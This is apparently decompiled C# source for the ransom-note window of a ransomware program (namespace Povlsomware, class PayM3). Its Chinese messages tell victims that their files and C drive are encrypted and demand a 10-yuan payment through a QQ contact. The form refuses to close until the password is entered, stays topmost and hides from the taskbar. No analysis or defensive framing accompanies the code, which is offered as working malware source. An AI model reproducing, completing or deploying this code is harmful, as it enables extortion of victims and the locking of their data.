using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace Povlsomware;

public class PayM3 : Form
{
	private bool success;

	private IContainer components;

	private TextBox textBox1;

	private Button button1;

	private Label label1;

	private Label label2;

	private ListBox listBox1;

	private Label label3;

	private TextBox textBox2;

	private PictureBox pictureBox1;

	private BackgroundWorker backgroundWorker1;

	private PictureBox pictureBox2;

	public PayM3()
	{
		InitializeComponent();
		((Control)label2).set_Text(Program.count + " 个文件被加密");
		ObjectCollection items = listBox1.get_Items();
		object[] array = Program.encryptedFiles.ToArray();
		items.AddRange(array);
		((Control)textBox2).set_Text("只有输入正确的密码才能解锁文件. \n\r获得解锁密码，请加qq209647681 \n\r软件如果强行关闭后请重新打开，不要删除，不然永远解不开了！. \n\r你的C盘已经完全加密了！. \n\r扫码付款10元后加作者QQ解密！.");
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		string text = ((Control)textBox1).get_Text();
		if (text == Program.GetPass())
		{
			success = true;
			((Control)button1).set_Text("请等待解密");
			backgroundWorker1.RunWorkerAsync(text);
		}
		else
		{
			((Control)textBox1).set_Text(string.Empty);
			((ContainerControl)this).set_ActiveControl((Control)(object)textBox1);
			((Control)button1).set_Text("密码错误 ");
		}
	}

	private void Screen_FormClosing(object sender, FormClosingEventArgs e)
	{
		if (!success)
		{
			((CancelEventArgs)(object)e).Cancel = true;
		}
	}

	private void PayM3_Load(object sender, EventArgs e)
	{
		((Control)this).Show();
	}

	private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		string decryption_password = e.Argument as string;
		Program.UndoAttack(decryption_password);
	}

	private void backgroundWorker1_RunWorkerCompleted(object sender, RunWorkerCompletedEventArgs e)
	{
		Application.Exit();
	}

	private void textBox2_TextChanged(object sender, EventArgs e)
	{
	}

	private void pictureBox1_Click(object sender, EventArgs e)
	{
	}

	private void listBox1_SelectedIndexChanged(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Expected O, but got Unknown
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_0132: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected O, but got Unknown
		//IL_015d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f4: Expected O, but got Unknown
		//IL_0224: Unknown result type (might be due to invalid IL or missing references)
		//IL_029d: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a7: Expected O, but got Unknown
		//IL_02d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_0368: Unknown result type (might be due to invalid IL or missing references)
		//IL_03fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0481: Unknown result type (might be due to invalid IL or missing references)
		//IL_048b: Expected O, but got Unknown
		//IL_04b4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0540: Unknown result type (might be due to invalid IL or missing references)
		//IL_054a: Expected O, but got Unknown
		//IL_0564: Unknown result type (might be due to invalid IL or missing references)
		//IL_0606: Unknown result type (might be due to invalid IL or missing references)
		//IL_0610: Expected O, but got Unknown
		//IL_062e: Unknown result type (might be due to invalid IL or missing references)
		//IL_075b: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a6: Unknown result type (might be due to invalid IL or missing references)
		//IL_07b0: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(PayM3));
		textBox1 = new TextBox();
		button1 = new Button();
		label1 = new Label();
		label2 = new Label();
		listBox1 = new ListBox();
		label3 = new Label();
		textBox2 = new TextBox();
		pictureBox1 = new PictureBox();
		backgroundWorker1 = new BackgroundWorker();
		pictureBox2 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((ISupportInitialize)pictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_Font(new Font("Microsoft Sans Serif", 10f));
		((Control)textBox1).set_Location(new Point(57, 324));
		((Control)textBox1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(209, 23));
		((Control)textBox1).set_TabIndex(0);
		((Control)button1).set_BackColor(Color.Yellow);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 12f));
		((Control)button1).set_Location(new Point(56, 353));
		((Control)button1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(208, 43));
		((Control)button1).set_TabIndex(1);
		((Control)button1).set_Text("请解密!");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)Button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)1));
		((Control)label1).set_ForeColor(SystemColors.ButtonFace);
		((Control)label1).set_Location(new Point(301, 6));
		((Control)label1).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(213, 20));
		((Control)label1).set_TabIndex(2);
		((Control)label1).set_Text("你所有的文件都是加密的！");
		label1.set_TextAlign((ContentAlignment)32);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Microsoft Sans Serif", 8f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_ForeColor(SystemColors.ButtonFace);
		((Control)label2).set_Location(new Point(301, 30));
		((Control)label2).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(41, 13));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("label2");
		((ListControl)listBox1).set_FormattingEnabled(true);
		listBox1.set_HorizontalScrollbar(true);
		listBox1.set_ItemHeight(12);
		((Control)listBox1).set_Location(new Point(304, 45));
		((Control)listBox1).set_Margin(new Padding(2, 3, 2, 3));
		((Control)listBox1).set_Name("listBox1");
		((Control)listBox1).set_Size(new Size(615, 328));
		((Control)listBox1).set_TabIndex(4);
		listBox1.add_SelectedIndexChanged((EventHandler)listBox1_SelectedIndexChanged);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_ForeColor(Color.Yellow);
		((Control)label3).set_Location(new Point(54, 309));
		((Control)label3).set_Margin(new Padding(2, 0, 2, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(59, 12));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("输入密码:");
		textBox2.set_AcceptsReturn(true);
		((Control)textBox2).set_BackColor(Color.DarkTurquoise);
		((TextBoxBase)textBox2).set_BorderStyle((BorderStyle)0);
		((Control)textBox2).set_Font(new Font("Microsoft Sans Serif", 10f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox2).set_ForeColor(SystemColors.ButtonFace);
		((Control)textBox2).set_Location(new Point(0, 6));
		((Control)textBox2).set_Margin(new Padding(2));
		((TextBoxBase)textBox2).set_Multiline(true);
		((Control)textBox2).set_Name("textBox2");
		((TextBoxBase)textBox2).set_ReadOnly(true);
		((Control)textBox2).set_Size(new Size(297, 142));
		((Control)textBox2).set_TabIndex(6);
		textBox2.set_TextAlign((HorizontalAlignment)2);
		((Control)textBox2).add_TextChanged((EventHandler)textBox2_TextChanged);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(0, 119));
		((Control)pictureBox1).set_Margin(new Padding(2));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(155, 188));
		pictureBox1.set_TabIndex(0);
		pictureBox1.set_TabStop(false);
		((Control)pictureBox1).add_Click((EventHandler)pictureBox1_Click);
		backgroundWorker1.DoWork += backgroundWorker1_DoWork;
		backgroundWorker1.RunWorkerCompleted += backgroundWorker1_RunWorkerCompleted;
		pictureBox2.set_Image((Image)componentResourceManager.GetObject("pictureBox2.Image"));
		((Control)pictureBox2).set_Location(new Point(151, 119));
		((Control)pictureBox2).set_Margin(new Padding(2));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(133, 188));
		pictureBox2.set_TabIndex(7);
		pictureBox2.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.DarkTurquoise);
		((Form)this).set_ClientSize(new Size(960, 399));
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)listBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Margin(new Padding(2, 3, 2, 3));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("PayM3");
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("扫码付款联系QQ解密！");
		((Form)this).set_TopMost(true);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Screen_FormClosing));
		((Form)this).add_Load((EventHandler)PayM3_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((ISupportInitialize)pictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
